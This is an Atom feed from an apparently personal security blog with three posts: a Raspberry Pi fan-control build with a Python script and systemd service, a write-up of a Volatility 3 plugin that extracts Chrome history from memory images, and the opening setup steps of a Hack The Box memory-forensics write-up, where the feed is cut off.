<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="https://its-radio.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://its-radio.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2025-08-20T03:24:38+00:00</updated><id>https://its-radio.github.io/feed.xml</id><title type="html">blank</title><subtitle>A blog about threat detection &amp; intelligence, CTFs &amp; education, and other information security topics </subtitle><entry><title type="html">Fan Service</title><link href="https://its-radio.github.io/blog/2025/raspberryos_fan_control/" rel="alternate" type="text/html" title="Fan Service"/><published>2025-06-16T00:00:00+00:00</published><updated>2025-06-16T00:00:00+00:00</updated><id>https://its-radio.github.io/blog/2025/raspberryos_fan_control</id><content type="html" xml:base="https://its-radio.github.io/blog/2025/raspberryos_fan_control/"><![CDATA[<style>.small-margin>*{margin-bottom:.1rem}</style> <h1 id="housekeeping">Housekeeping</h1> <ol> <li>Get my custom service from <a href="https://github.com/its-radio/fan-control">my github</a></li> <li>For quick plugin installation and usage instructions, see the readme on the github link, above.</li> </ol> <h1 id="introduction">Introduction</h1> <p>As part of my home-network setup, I have RaspberryPi 4 that runs a network fileserver and a <a href="https://pi-hole.net/">PiHole</a>. I got the particular RaspberryPi in question as part of a retro gaming kit that came with a housing for the RaspberryPi, game controllers, etc. The housing that came with the kit included a cooling fan and for most of the time that I’ve used this setup, the fan has seemed to function normally. That is, it seemed to turn on for some amount of time at boot, then eventually turn off. I never particularly stress this system, and the fan didn’t run much, so I never thought much about the fan. Until now.</p> <h1 id="the-problem">The problem</h1> <p>Recently, the fan has been running continually. I’ve repeatedly checked on the CPU usage on the RaspberryPi to see if some rogue process is consuming resources without my knowledge, but the CPU usage and temperature are always low. There doesn’t seem to be a good reason for the fan to be running.</p> <h1 id="diagnosis">Diagnosis</h1> <p>I hadn’t thought about wiring the fan since I assembled the kit a few years ago, so I opened it up to see which pins it was wired to. Despite being a 5v fan, when I opened up the casing, the fan pins were connected to the physical pin 1 (3.3V PWR) and pin 14 (gnd).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/raspberryos_fan_control/original_pins.png" sizes="95vw"/> <img src="/assets/img/raspberryos_fan_control/original_pins.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Original fan pins </div> <p>It makes sense that this would cause it to run continually (if a bit slowly due to the lower-than-designed voltage), but I have no idea why it didn’t <em>always</em> run contually the entire time I’ve owned it. I can’t really account for the fact that the fan used to turn on at boot and then later turn off.</p> <h1 id="the-solution">The Solution</h1> <p>To solve this problem, I had to do 2 main things:</p> <ol> <li>Figure out how to wire to fan to the RaspberryPi (i.e. <strong>The Hardware</strong>)</li> <li>Figure out how to make the RaspberryPi control the pins that the fan was wired to (i.e. <strong>The Software</strong>)</li> </ol> <h2 id="the-hardware">The Hardware</h2> <p>First I wanted to just connect the fan from the pin 2 (5v PWR) to one of the GPIO pins and control it that way. When I drop the GPIO pin to low, current would flow from the 5v pin accross the fan, and cause it to spin, but it turns out that the GPIO pins can’t take enough current for that solution to work.</p> <p>Instead, I had to create a simple circuit that uses a GPIO pin to control the current flow between the 5v pin and a ground pin. Here is a diagram of the circuit.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/raspberryos_fan_control/circuit_drawing.png" sizes="95vw"/> <img src="/assets/img/raspberryos_fan_control/circuit_drawing.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Drawing of the circuit </div> <p>The components:</p> <ol> <li>RaspberryPi 4</li> <li>5V cooling fan (Mine has serial number ED3007S1M-AP00 and <a href="https://vilros.com/products/vilros-raspberry-pi-fan">this</a> is a close match)</li> <li>NPN transistor (I had a 2N3904 leftover in a circuits kit from undergrad, which turned out to be suitable for the job)</li> <li>1k Ohm resistor</li> <li>(optional) A diode to protect the RaspberryPi from current generated by the fan being spun by external forces</li> </ol> <p>I didn’t include the diode because I didn’t have one on hand, but I plan to add one soon. If you use this solution, be careful not to dust your fan while its connected to the RaspberryPi if you do not use the diode!</p> <p>I built the circuit on a breadboard before I soldered it all together just to make sure it all worked, but thats not really necessary with such a simple circuit.</p> <p>The circuit:</p> <ol> <li>Connect pin 2 (5V pwr) on the RaspberryPi to the high (+) pin on the fan.</li> <li>Connect the low (-) pin on the fan to the controller pin of the NPN transistor</li> <li>Connect pin 6 (GND) on the RaspberryPi to the emitter pin of the NPN transistor</li> <li>Connect pin 8 (GPIO 14) on the RaspberryPi to the base pin on the NPN transistor</li> </ol> <p>There is a commandline tool for RaspberryPi called <a href="https://github.com/RPi-Distro/raspi-gpio">raspi-gpio</a> that allows you to manually control the states of the various gpio pins on the board. After you create the circuit described above, you can test the circuit with the following commands:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># set GPIO as output. Do this once</span>
raspi-gpio <span class="nb">set </span>14 op

<span class="c"># turn the fan on</span>
raspi-gpio <span class="nb">set </span>14 dh

<span class="c"># turn the fan off</span>
raspi-gpio <span class="nb">set </span>14 dl
</code></pre></div></div> <p>After testing manually with the circuit on the breadboard and <code class="language-plaintext highlighter-rouge">raspi-gpio</code>, I soldered it all together and moved on to making it work automatically.</p> <h2 id="the-software">The Software</h2> <p>Since implementing the solution below, I learned that I didn’t have to try this hard, and I could have solved the problem by adding a single line to <code class="language-plaintext highlighter-rouge">/boot/config.txt</code>. But thats no fun anyway! It’s easy enough to implement a custom solution for a problem like this, so I came up a plan to control the fan.</p> <p>The plan:</p> <ol> <li>Create a simple Python script that regularly checks the CPU temperature, turns the fan on if the temperature reaches a trigger temperature, and then turns the fan off if/when the temperature falls below a trigger temperature.</li> <li>Create a service that runs the script on boot</li> </ol> <h3 id="the-python-script">The Python Script</h3> <p>This script belongs to root and is stored in <code class="language-plaintext highlighter-rouge">/root/scripts/fan-control.py</code>. The script uses <code class="language-plaintext highlighter-rouge">raspi-gpio</code> to control the pin’s state, and <a href="https://www.raspberrypi.com/documentation/computers/os.html#vcgencmd">vcgencmd</a> to check CPU temperature. These are the only two abilities needed to create simple control logic for the fan. The script checks CPU temperature and makes a decesion about the fan every 5 seconds.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="n">subprocess</span>
<span class="kn">import</span> <span class="n">time</span>
<span class="kn">import</span> <span class="n">os</span>

<span class="n">GPIO_PIN</span> <span class="o">=</span> <span class="mi">14</span>
<span class="n">ON_TEMP</span> <span class="o">=</span> <span class="mi">70</span>
<span class="n">OFF_TEMP</span> <span class="o">=</span> <span class="mi">60</span>

<span class="k">def</span> <span class="nf">set_gpio</span><span class="p">(</span><span class="n">output</span><span class="p">):</span>
    <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">raspi-gpio set </span><span class="si">{</span><span class="n">GPIO_PIN</span><span class="si">}</span><span class="s"> op</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">raspi-gpio set </span><span class="si">{</span><span class="n">GPIO_PIN</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="sh">"</span><span class="s">dh</span><span class="sh">"</span> <span class="k">if</span> <span class="n">output</span> <span class="o">==</span> <span class="mi">0</span> <span class="k">else</span> <span class="sh">"</span><span class="s">dl</span><span class="sh">"</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_temp</span><span class="p">():</span>
    <span class="n">out</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">check_output</span><span class="p">([</span><span class="sh">'</span><span class="s">vcgencmd</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">measure_temp</span><span class="sh">'</span><span class="p">])</span>
    <span class="n">temp_str</span> <span class="o">=</span> <span class="n">out</span><span class="p">.</span><span class="nf">decode</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">=</span><span class="sh">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">"'"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">return</span> <span class="nf">float</span><span class="p">(</span><span class="n">temp_str</span><span class="p">)</span>

<span class="n">fan_on</span> <span class="o">=</span> <span class="bp">False</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">temp</span> <span class="o">=</span> <span class="nf">get_temp</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">temp</span> <span class="o">&gt;=</span> <span class="n">ON_TEMP</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">fan_on</span><span class="p">:</span>
        <span class="nf">set_gpio</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
        <span class="n">fan_on</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="k">elif</span> <span class="n">temp</span> <span class="o">&lt;=</span> <span class="n">OFF_TEMP</span> <span class="ow">and</span> <span class="n">fan_on</span><span class="p">:</span>
        <span class="nf">set_gpio</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">fan_on</span> <span class="o">=</span> <span class="bp">False</span>
    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</code></pre></div></div> <p>If implementing this solution yourself, you must make the script executable, atleast by root, with:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>754 /root/scripts/fan-control.py
</code></pre></div></div> <h3 id="the-service">The Service</h3> <p>The service, like other services, is stored in <code class="language-plaintext highlighter-rouge">/etc/systemd/system/fan-control.service</code></p> <p>Here is the content of the service:</p> <div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">[Unit]</span>
<span class="py">Description</span><span class="p">=</span><span class="s">Raspberry Pi Fan Controller</span>
<span class="py">After</span><span class="p">=</span><span class="s">multi-user.target</span>

<span class="nn">[Service]</span>
<span class="py">ExecStart</span><span class="p">=</span><span class="s">/usr/bin/python3 /root/scripts/fan-control.py</span>
<span class="py">Restart</span><span class="p">=</span><span class="s">always</span>

<span class="nn">[Install]</span>
<span class="py">WantedBy</span><span class="p">=</span><span class="s">multi-user.target</span>
</code></pre></div></div> <h3 id="making-it-work">Making it work</h3> <p>To start the service and make sure that it starts at boot, you can use the following commands</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>systemctl daemon-reload
<span class="nb">sudo </span>systemctl <span class="nb">enable </span>fan-control
<span class="nb">sudo </span>systemctl start fan-control
</code></pre></div></div> <h2 id="testing">Testing</h2> <p>After implementing the circuit and the service described above, the fan briefly turned on at boot, then turned off. I wanted to test it to see if it would really come on at 70C and turn off at 60C. I only have SSH access to the RaspberryPi so I needed a oneliner to stress the CPU and report the temp to me at the same time. I used the following:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span>vcgencmd measure_temp<span class="p">;</span> <span class="nb">sleep </span>3<span class="p">;</span> <span class="k">done</span><span class="o">)</span> &amp; <span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..4<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nb">sha1sum</span> /dev/zero &amp; <span class="k">done</span>
</code></pre></div></div> <p>Basically this reports temperature on the commandline every 3 seconds and also calculates the sha1 hash of infinite zeros 4 times. All this will do is chew up CPU and ram until it is stopped, which I can manually do by inputting CTRL+C, then:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>killall <span class="nb">sha1sum</span><span class="p">;</span> <span class="nb">kill</span> %1
</code></pre></div></div> <p>After stressing the CPU with this test, I found that the fan did, in fact, turn on at 70C as expected and turned off at 60C when I stopped the CPU stressing.</p> <h1 id="conclusion">Conclusion</h1> <p>This was a fun exercise for me since I have not had much experience implementing solutions like this, i.e. building small control cicuits &amp; logic that actually solve a problem. This project was very simple, but it has made me want to pursue similar projects and add other hardware devices to to RaspberryPi or other minicomputers that I own.</p> <p>Thanks for reading! If you have any questions or comments, feel free to reach out or follow <a href="https://x.com/its_rad_io">me on X</a></p>]]></content><author><name></name></author><category term="Code"/><category term="Linux"/><category term="raspberrypi"/><category term="fan"/><category term="service"/><category term="python"/><category term="linux"/><summary type="html"><![CDATA[The fan on my RaspberryPi NAS & PiHole wouldn't stop running, so I built a custom solution.]]></summary></entry><entry><title type="html">Chrome Browser History Plugin for Volatility 3</title><link href="https://its-radio.github.io/blog/2025/chrome_hx_volatility_plugin/" rel="alternate" type="text/html" title="Chrome Browser History Plugin for Volatility 3"/><published>2025-05-17T00:00:00+00:00</published><updated>2025-05-17T00:00:00+00:00</updated><id>https://its-radio.github.io/blog/2025/chrome_hx_volatility_plugin</id><content type="html" xml:base="https://its-radio.github.io/blog/2025/chrome_hx_volatility_plugin/"><![CDATA[<style>.small-margin>*{margin-bottom:.1rem}</style> <h1 id="housekeeping">Housekeeping</h1> <ol> <li>Get my chrome_hx plugin from <a href="https://github.com/its-radio/volatility_plugins/">my github</a></li> <li>For quick plugin installation and usage instructions, see the readme on the github link, above.</li> <li>Get Volatility3 from the <a href="https://github.com/volatilityfoundation/volatility3">Volatility Foundation’s github</a></li> </ol> <h1 id="introduction-to-the-chrome_hx-plugin">Introduction to the chrome_hx plugin</h1> <p>A couple of months ago when I completed the Mellitus Sherlock (and wrote this post about it), I noticed that there wasn’t an easily accessible plugin available for Volatility 3 that could extract Chrome browser history in a single command. Now, the lack of such a plugin isn’t the end of the world. It’s not a difficult process to simply extract files related to a Chrome process, find the SQLite database called ‘History’, and then manually extract the browsing history. However, extracting browser history is a common task, so why not automate it via a plugin?</p> <p>I’ve never written a plugin before and since this seems like a fairly simple task, I thought this would be a good introduction to writing plugins for Volatility. In this post I’ll briefly describe how Volatility plugins work, how the plugin I wrote works, and how I might change it in the future.</p> <h1 id="background">background</h1> <p>In searching for a history extraction plugin for Volatility 3, I came across <a href="https://blog.superponible.com/2014/08/31/volatility-plugin-chrome-history/">this post</a>, describing some plugins written for Volatility 2. However, the post and plugins were written more than 10 years ago and I found that they are no longer functional. The writer had created plugins for extracting History, visits, search terms, downloads, download chains, and cookies. While I may eventually write all of these (I think it would be fairly easy once I have a skeleton down), I started with just extracting URLs visited from instances of Chrome running when the memory image was taken.</p> <h1 id="goals-for-the-plugin">Goals for the plugin</h1> <p>I’m writing this post in hindsight, having already written a functional history extraction plugin, but I will try to cover my process and explain how the plugin works. First, I’ll go over what the plugin should do:</p> <ol> <li>Find and extract the Chrome History Database from a memory image.</li> <li>Query the database and print the URLs visited to the terminal.</li> <li>Run on memory images from Windows systems.</li> </ol> <h1 id="basic-architecture--implementation">Basic architecture &amp; Implementation</h1> <p>How do we implement that functionality into a Volatility plugin? Well, since I had never written a plugin for Volatility, for anything for that matter, I thought I should go to the source for some education. The Volatility foundation provides some <a href="https://volatility3.readthedocs.io/en/stable/development.html">excellent documentation</a> describing how to get started with writing plugins for the framework. The sections on <a href="https://volatility3.readthedocs.io/en/stable/complex-plugin.html#writing-plugins-that-run-other-plugins">writing plugins that run other plugins</a> and <a href="https://volatility3.readthedocs.io/en/stable/complex-plugin.html#writing-plugins-that-output-files">writing plugins that output files</a> proved to be especially useful to me.</p> <h1 id="how-a-volatility-plugin-works">How a Volatility plugin works</h1> <p>Read the link documentation for a more in depth description, but at a high level, a Volatility plugin consists of the following general parts:</p> <ol> <li><strong>The plugin class</strong><br/> Wrapping everything else in the plugin is a class named for the plugin (i.e. with my plugin being called with windows.chrome_hx, I named this class Chrome_Hx), that inherits from PluginInterface (a class that acts as an interface to the framework and signals that this is a plugin that can be used by the framework).</li> <li><strong>The requirements</strong><br/> A list of required input variables like PID, memory addresses, etc. These requirements can then be provided by the framework if available. If other plugins are going to be used, they should also be listed here as requirements.</li> <li><strong>The run() method</strong><br/> When the framework tries to make use of a plugin, it does so by importing it and calling its run() method, so this method functions kind of like a main() normally would. Additionally, the run() method is required to return a TreeGrid object. Whatever is in the TreeGrid object is what will actually get printed to the terminal as output from the plugin.</li> <li><strong>The _generator() method</strong><br/> Though not technically required, it is common to write a method called _generator() that is used to populate the TreeGrid object that is returned by run(). This takes much of the heavy lifting out of run(), simplifying the population process.</li> </ol> <p>And that’s it! Just to briefly review, as long as the plugin class inherits from PluginInterface it gets recognized and imported by the framework. The requirements are checked and provided to the plugin. The run() method is run, which should return a TreeGrid object that is populated by the _generator() method.</p> <h1 id="how-my-plugin-works">How my plugin works</h1> <p>I won’t go over my entire development process, but I’ll try to give an overview of how it works and where it came from. If you want to follow along in my code, you can find it from <a href="https://github.com/its-radio/volatility_plugins/">my github</a>. In essence, all my plugin had to do is:</p> <ol> <li>Find a specific process</li> <li>Find a specific file related to the process</li> <li>Dump that file</li> <li>Read that file</li> <li>Output some specific contents</li> </ol> <p>Given that there are already plugins that find processes (<code class="language-plaintext highlighter-rouge">pslist</code>, <code class="language-plaintext highlighter-rouge">psscan</code>, etc.) and dump files (<code class="language-plaintext highlighter-rouge">dumpfiles</code>), I knew that I could borrow quite a bit of functionality from them. Given that my plugin needs to dump a file, I took a fair bit of inspiration from the <code class="language-plaintext highlighter-rouge">dumpfiles</code> plugin. In fact, my first proof of concept was to just take the <code class="language-plaintext highlighter-rouge">dumpfiles</code> plugin and add functionality to look for and parse the contents of SQLite databases that it outputs. After that worked, I knew I was on track, but I didn’t want to just copy the entire plugin since doing that would repeat a bunch of existing code. Then, I wrote a new plugin that included some code directly from <code class="language-plaintext highlighter-rouge">dumpfiles</code> and used methods from <code class="language-plaintext highlighter-rouge">pslist</code>, <code class="language-plaintext highlighter-rouge">handles</code>, and <code class="language-plaintext highlighter-rouge">dumpfiles</code>.</p> <h1 id="the-class">The class</h1> <p>My plugin class is called <code class="language-plaintext highlighter-rouge">Chrome\_Hx</code>. It, of course, inherits from <code class="language-plaintext highlighter-rouge">PluginInterface</code>.</p> <h1 id="the-requirements">The requirements</h1> <ol> <li><strong>Kernel</strong><br/> This is required in basically every plugin. Since this is a windows plugin, it just gets assigned as Windows Kernel for Intel 32 &amp; 64 bit architectures</li> <li><strong>PID</strong><br/> I opted to have PID be the typical way that Chrome instances would be identified for extraction. If this requirement is omitted, the plugin still works, but it takes longer since it has to look for Chrome history DBs in every PID, even if it’s not associated with Chrome.</li> <li><strong>Filter</strong><br/> This requirement tells the plugin what pattern to look for in a filename that it is going to dump. This is the main method the plugin uses to identify Chrome history databases. It defaults to searching for a regex <code class="language-plaintext highlighter-rouge">Chrome.\*History$</code>. This regex will match filenames whose path consists of anything, then “Chrome”, then anything, and then end with “History”.<br/> In my experience, this is a consistent naming convention for Chrome history databases. However, if the default regex doesn’t work, the user can specify a different regex for a specific situation.</li> <li><strong>Ignore-case</strong><br/> This is a modifier for the Filter requirement. If the user needs to specify a different regex, this allows them to toggle case sensitivity on and off as desired.</li> <li><strong><code class="language-plaintext highlighter-rouge">pslist</code> plugin</strong><br/> The <code class="language-plaintext highlighter-rouge">pslist</code> plugin, used to filter for files with specific PIDs</li> <li><strong><code class="language-plaintext highlighter-rouge">dumpfiles</code> plugin</strong><br/> The <code class="language-plaintext highlighter-rouge">dumpfiles</code> plugin, used to process files found by windows.chrome_hx</li> <li><strong><code class="language-plaintext highlighter-rouge">handles</code> plugin</strong><br/> Used to analyze and use the handles pointing to objects in use by the process(es) found by <code class="language-plaintext highlighter-rouge">pslist</code>.</li> </ol> <h1 id="the-run-method">The run() method</h1> <p>The run method mainly does three things. First, it uses the <code class="language-plaintext highlighter-rouge">PsList</code> class to create a filter function to filter for processes of the PID specified by the user. Second, it uses the <code class="language-plaintext highlighter-rouge">PsList</code> class to create a generator object, procs, representing the various process objects that correspond to the process(es) matching the filter function. Third (and finally) it returns a TreeGrid while calling the <code class="language-plaintext highlighter-rouge">\_generator()</code> method (with <code class="language-plaintext highlighter-rouge">procs</code> as the only argument passed) to do the rest of the work and populate the TreeGrid.</p> <h1 id="the-_generator-method">The _generator method</h1> <p>This is where most of the functionality of the plugin is implemented, meaning it is the most important and most complex part (though it remains fairly straightforward). Here is a simplified explanation of what it does: For each process passed from <code class="language-plaintext highlighter-rouge">run()</code>, it generates a list of all the handles that process was using. <br/> Since handles are just a way for the computer to keep track of other files, processes, or anything else that the process has to communicate with, the plugin also needs to filter out any handles that aren’t to files, since we are only interested in files. Next the plugin applies the filter value that was previously specified as the default to search for Chrome history databases. It checks if it has previously dumped this file and, if it hasn’t, it adds an entry to a set to keep track of files it has dumped. Then it dumps the file’s contents and adds the name the file was written as to a list.</p> <p>After all the filtered files have been dumped, the method goes through the list of names of dumped files. It checks if the files are SQLite databases by checking their magic bytes, then tries to use the <code class="language-plaintext highlighter-rouge">sqlitle3</code> python module to dump the contents of the <code class="language-plaintext highlighter-rouge">url</code> table. The resultant data from the table is formatted for the TreeGrid and then yielded back to be output by the framework. The portion that tries to do the SQLite work is wrapped in try-except syntax because there are often two databases that get dumped: One ending in <code class="language-plaintext highlighter-rouge">.vacb</code> (virtual address control block) and one ending in <code class="language-plaintext highlighter-rouge">.dat</code>. These are really the same database, but there are some important differences between them and they don’t always play nicely with SQLite after being dumped. The <code class="language-plaintext highlighter-rouge">.dat</code> file is the actual database that Chrome reads from the filesystem, while the <code class="language-plaintext highlighter-rouge">.vacb</code> one is the working version of the history that Chrome is updating in memory in real time, meaning it could have more up-to-date information. However, I have encountered cases in which one is malformed while the other is intact, so it’s worthwhile to try to dump both of them.</p> <p><strong>Note:</strong> If they are both malformed for some reason, you can use these commands with <a href="https://sqlite.org/index.html">sqlite3</a> installed on a Linux system to try to repair one or both of them:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlite3 <span class="se">\&lt;</span>malformed<span class="se">\_</span>db<span class="se">\&gt;</span>.dat <span class="s2">".recover"</span> <span class="se">\&gt;</span> salvaged.sql  <span class="se">\#</span> parse recoverable portions of the db  
sqlite3 new<span class="se">\_</span>fixed.db <span class="se">\&lt;</span> salvaged.sql  <span class="se">\#</span> reconstruct a new database with the recovered portions  
sqlite3 new<span class="se">\_</span>fixed.db  <span class="se">\#</span> try to open the db <span class="k">in </span>sqlite3 again  
</code></pre></div></div> <h1 id="output">Output</h1> <p>This plugin outputs the URLs table from the Chrome history database as text, but it also outputs the files that came up as matches during its search. These files can be analyzed manually with any sqlite parser like <code class="language-plaintext highlighter-rouge">sqlite3</code> or <code class="language-plaintext highlighter-rouge">sqlitebrowser</code>, and they contain quite a bit more than this plugin actually prints to the terminal.</p> <h1 id="limitations">Limitations</h1> <ol> <li><strong>I’m new!</strong><br/> I am rather new to writing plugins for Volatility. Even though I tried my best to stick to their recommendations and standards, it’s possible that I fell short in these regards. If anyone more familiar with Volatility plugins has feedback, I would welcome it.</li> <li><strong>Lack of samples</strong><br/> I tested this on several memory images collected from Windows 10 machines that I own, as well as a few from CTFs or Sherlocks from Hack The Box. All things considered, this isn’t a very large sample size so I can’t be sure how well it will work generalized across any image collected from a Windows machine. If you have any issues, please create an issue on github and ideally send me some output with <code class="language-plaintext highlighter-rouge">-vv</code> enabled.</li> <li><strong>Simple filtering approach</strong><br/> The filtering approach I chose just tries to match the regex <code class="language-plaintext highlighter-rouge">Chrome.\*History$</code>. That could be too simple and might end up matching files that aren’t actually Chrome history databases. I thought about checking if the file was an SQLite before dumping to add an extra layer of filtering, but that would have meant messing around with the methods in <code class="language-plaintext highlighter-rouge">dumpfiles</code>, which I didn’t want to do.</li> </ol> <h1 id="future-improvement">Future improvement</h1> <p>Since this is my first foray into writing a plugin, I’ve kept it fairly basic. However, in the future there are a few directions I might take this project:</p> <ol> <li>Expand to work on Mac OS and Linux memory images</li> <li>Extract more types of information (e.g. downloads, search terms, etc.) based on user prompting</li> <li>Extract this type of data from different browsers other than Chrome</li> <li>Search for any Chrome instances to extract files from automatically without the user having to enter a PID</li> <li>Do more to validate extracted files as SQLite databases</li> <li>Add recovery to try to repair databases if they are dumped but malformed</li> </ol> <h1 id="conclusion">Conclusion</h1> <p>I created this plugin primarily as an educational project, but also in the hopes that someone else might find it useful. It’s not perfect and it’s not hard to access the database, but again, why not automate what we can? I learned a lot about Volatility during this project and I look forward to writing more plugins in the future.</p>]]></content><author><name></name></author><category term="Code"/><category term="forensics"/><category term="memory"/><category term="browser"/><category term="chrome"/><category term="volatility"/><summary type="html"><![CDATA[A discription of a plugin I wrote for Volatility 3. The plugin searches for, extracts, and parses Google Chrome history databases in forensic memory images.]]></summary></entry><entry><title type="html">HTB Write-Up | Medium Sherlock | Mellitus</title><link href="https://its-radio.github.io/blog/2025/Mellitus-Write-Up/" rel="alternate" type="text/html" title="HTB Write-Up | Medium Sherlock | Mellitus"/><published>2025-02-22T00:00:00+00:00</published><updated>2025-02-22T00:00:00+00:00</updated><id>https://its-radio.github.io/blog/2025/Mellitus-Write-Up</id><content type="html" xml:base="https://its-radio.github.io/blog/2025/Mellitus-Write-Up/"><![CDATA[<style>.small-margin>*{margin-bottom:.1rem}</style> <h2 id="introduction">Introduction</h2> <p>This is a write-up for Hack The Box’s Sherlock challenge, <strong>Mellitus</strong>. This Sherlock is rated as <strong>Medium</strong>, but I’ll try to keep the write-up beginner friendly and approachable. I’ll cover most methods thoroughly and explain the reasoning for decisions that I make. If there is anything you don’t understand or if you have any specific questions, please feel free to reach out to me on X. Seriously! I’ll actually try to help you out.</p> <h2 id="tools--setup">Tools &amp; Setup</h2> <p>For this investigation, I exclusively used a machine running Fedora 40, meaning that I had access to all the standard linux tools like <code class="language-plaintext highlighter-rouge">grep</code>, <code class="language-plaintext highlighter-rouge">strings</code>, etc. Of course, there are Windows equivalents for most of these tools, and it is possible to repeat any of these steps on Windows.</p> <p>The primary forensics tools I relied on for this challenge was the <a href="https://volatilityfoundation.org/">Volatility Framework</a>–an invaluable, open-source memory forensics tool. I mainly used <a href="https://github.com/volatilityfoundation/volatility3">Volatility 3</a> but it may also be useful to have <a href="https://github.com/volatilityfoundation/volatility">Volatility 2</a> on hand in some cases.</p> <p>I am working on my own Volatility cheatsheet which I may post later, but for now let me point you to this excellent <a href="https://blog.onfvp.com/post/volatility-cheatsheet/">cheatsheet by Ashley Peterson</a>. It shows how to use a bunch of the most useful Volatility plugins in both Volatility 2 and Volatility 3.</p> <h2 id="starting-out">Starting Out</h2> <p>I always start by thoroughly reading the description. It reads:</p> <p><em>You’ve been a SOC analyst for the last 4 years but you’ve been honing your incident response skills! It’s about time you bite the bullet and go for your dream job as an Incident Responder as that’s the path you’d like your career to follow. Currently you are going through the interview process for a medium size incident response internal team and the cocky interviewing responder has given you a tough technical challenge to test your memory forensics aptitude. Can you get all the questions right and secure the job?</em></p> <p>Okay, not much in there except that we are looking at memory forensics and it’s likely that the evidence is going to be similar to something a responder might encounter in an incident response.</p> <h2 id="downloading-mellituszip-and-decompressing-it">Downloading mellitus.zip and decompressing it</h2> <p>For whatever reason I’ve had trouble with the <code class="language-plaintext highlighter-rouge">unzip</code> command handling the evidence archives from HTB, so I always use <code class="language-plaintext highlighter-rouge">7z</code> to decompress them. Other compression tools probably work, but <code class="language-plaintext highlighter-rouge">7z</code> is a popular and easy choice. Keep in mind that you’ll need to enter a password in order to decompress the archive. You can get the password on HTB as shown in the image below.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/1.png" sizes="95vw"/> <img src="/assets/img/mellitus/1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 1 </div> <p>Decompress the archive as shown and take a look at what’s inside. You can use (also shown in Fig. 2):</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7z x mellitus.zip
</code></pre></div></div> <p>The evidence consists of 2 files (Fig. 2):</p> <ol> <li>memory_dump.vmem This is a memory image created by VMWare virtualization software. That is, it’s one to one copy of the RAM on a VMWare virtual machine at the time the image was taken. It should contain the bulk of the important information.</li> <li>memory_dump.vmsn This is a file that contains snapshot information about the VM. I am not too familiar with analyzing these forensically, but VM snapshots contain information about the current state of the machine, configuration information, etc. It could prove useful.</li> </ol> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/2.png" sizes="95vw"/> <img src="/assets/img/mellitus/2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 2 </div> <p><strong>Note:</strong> <em>I like to save my volatility output so that I can easily grep through it later, but I don’t want to grep the entire image each time. to facilitate this, I’ve organized my challenge directory like this:</em></p> <pre><code class="language-plain">mellitus
    output
        &lt;My outputs go here&gt;
        &lt;I'm mostly working from this dir&gt;
    vmems
        memory_dump.vmem
        memory_dump.vmsn
